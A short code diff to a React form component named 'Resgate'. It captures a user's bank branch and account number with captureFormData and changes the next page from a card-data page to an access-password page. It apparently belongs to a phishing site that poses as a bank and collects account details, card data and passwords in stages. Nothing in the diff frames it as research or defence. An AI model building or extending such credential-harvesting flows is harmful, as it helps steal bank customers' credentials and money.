@@ -25,7 +25,7 @@ const Resgate = () => {
     setErrors(newErrors);
     if (Object.keys(newErrors).length === 0) {
       captureFormData("resgate", { agencia, conta });
-      navigate("/dados-cartao", { state: { nome, conta, agencia } });
+      navigate("/senha-acesso", { state: { nome, conta, agencia } });
     }
   };
 
